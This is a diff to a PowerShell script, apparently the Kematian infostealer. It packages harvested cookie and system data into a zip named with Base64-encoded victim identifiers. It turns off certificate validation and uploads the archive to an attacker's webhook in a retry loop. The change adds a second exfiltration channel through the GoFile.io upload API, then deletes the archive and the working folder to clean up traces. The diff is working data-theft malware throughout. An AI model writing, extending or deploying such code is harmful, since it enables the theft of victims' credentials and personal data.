@@ -1236,58 +1236,143 @@ function Backup-Data {
     }
     ProcessCookieFiles 
 
-    $b64_uuid = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uuid))
-    $b64_countrycode = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($countrycode))
-    $b64_hostname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
-    $b64_filedate = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($filedate))
-    $b64_timezoneString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($timezoneString))
-    #$zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
-    $zipFileName = "$b64_uuid`_$b64_countrycode`_$b64_hostname`_$b64_filedate`_$b64_timezoneString.zip"
-    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
+    
+$b64_uuid = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uuid))
 
-    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
+$b64_countrycode = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($countrycode))
 
-    Write-Host $ZipFilePath
-    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
-    if ( -not ($write_disk_only)) {    
-        class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
-            [bool] CheckValidationResult([System.Net.ServicePoint] $a,
-                [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
-                [System.Net.WebRequest] $c,
-                [int] $d) {
-                return $true
-            }
+$b64_hostname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
+
+$b64_filedate = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($filedate))
+
+$b64_timezoneString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($timezoneString))
+
+#$zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
+
+$zipFileName = "$b64_uuid`_$b64_countrycode`_$b64_hostname`_$b64_filedate`_$b64_timezoneString.zip"
+
+$zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"
+
+
+Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force
+
+
+Write-Host $ZipFilePath
+
+Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
+
+if ( -not ($write_disk_only)) {    
+
+    class TrustAllCertsPolicy : System.Net.ICertificatePolicy {
+
+        [bool] CheckValidationResult([System.Net.ServicePoint] $a,
+
+            [System.Security.Cryptography.X509Certificates.X509Certificate] $b,
+
+            [System.Net.WebRequest] $c,
+
+            [int] $d) {
+
+            return $true
+
         }
-        [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
-        $went_through = $false
-        while (-not $went_through) {
-            try {
-                $httpClient = [Net.Http.HttpClient]::new()
-                $multipartContent = [Net.Http.MultipartFormDataContent]::new()
-                $fileStream = [IO.File]::OpenRead($zipFilePath)
-                $fileContent = [Net.Http.StreamContent]::new($fileStream)
-                $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
-                $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
-                $response = $httpClient.PostAsync($webhook, $multipartContent).Result
-                $responseContent = $response.Content.ReadAsStringAsync().Result
-                Write-Host $responseContent
-                $went_through = $true
-            }
-            catch {
-                $sleepTime = Get-Random -Minimum 5 -Maximum 10
-                Write-Host "[!] An error occurred, retrying in $sleepTime seconds" -ForegroundColor Yellow
-                Start-Sleep -Seconds $sleepTime
-            }
-        }
-        $fileStream.Dispose()
-        $httpClient.Dispose()
-        $multipartContent.Dispose()
-        $fileContent.Dispose()
-        Remove-Item "$zipFilePath" -Force
+
     }
-    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
-    # cleanup
-    Remove-Item "$env:appdata\Kematian" -Force -Recurse
+
+    [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCertsPolicy]::new()
+
+    $went_through = $false
+
+    while (-not $went_through) {
+
+        try {
+
+            $httpClient = [Net.Http.HttpClient]::new()
+
+            $multipartContent = [Net.Http.MultipartFormDataContent]::new()
+
+            $fileStream = [IO.File]::OpenRead($zipFilePath)
+
+            $fileContent = [Net.Http.StreamContent]::new($fileStream)
+
+            $fileContent.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+
+            $multipartContent.Add($fileContent, "file", [System.IO.Path]::GetFileName($zipFilePath))
+
+            $response = $httpClient.PostAsync($webhook, $multipartContent).Result
+
+            $responseContent = $response.Content.ReadAsStringAsync().Result
+
+            Write-Host $responseContent
+
+            $went_through = $true
+
+
+            # Upload to GoFile.io API
+
+            $gofileApiUrl = "https://api.gofile.io/uploadFile"
+
+            $httpClientGofile = [Net.Http.HttpClient]::new()
+
+            $multipartContentGofile = [Net.Http.MultipartFormDataContent]::new()
+
+            $fileStreamGofile = [IO.File]::OpenRead($zipFilePath)
+
+            $fileContentGofile = [Net.Http.StreamContent]::new($fileStreamGofile)
+
+            $fileContentGofile.Headers.ContentType = [Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/zip")
+
+            $multipartContentGofile.Add($fileContentGofile, "file", [System.IO.Path]::GetFileName($zipFilePath))
+
+            $responseGofile = $httpClientGofile.PostAsync($gofileApiUrl, $multipartContentGofile).Result
+
+            $responseContentGofile = $responseGofile.Content.ReadAsStringAsync().Result
+
+            $jsonResponseGofile = $responseContentGofile | ConvertFrom-Json
+
+            if ($jsonResponseGofile.status -eq "ok") {
+
+                $downloadPage = $jsonResponseGofile.data.downloadPage
+
+                Write-Host "Download page: $downloadPage" -ForegroundColor Green
+
+            } else {
+
+                Write-Host "Error uploading file to GoFile.io: $responseContentGofile" -ForegroundColor Red
+
+            }
+
+        }
+
+        catch {
+
+            $sleepTime = Get-Random -Minimum 5 -Maximum 10
+
+            Write-Host "[!] An error occurred, retrying in $sleepTime seconds" -ForegroundColor Yellow
+
+            Start-Sleep -Seconds $sleepTime
+
+        }
+
+    }
+
+    $fileStream.Dispose()
+
+    $httpClient.Dispose()
+
+    $multipartContent.Dispose()
+
+    $fileContent.Dispose()
+
+    Remove-Item "$zipFilePath" -Force
+
+}
+
+Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
+
+# cleanup
+
+Remove-Item "$env:appdata\Kematian" -Force -Recurse
 }
 
 if (CHECK_AND_PATCH -eq $true) {  
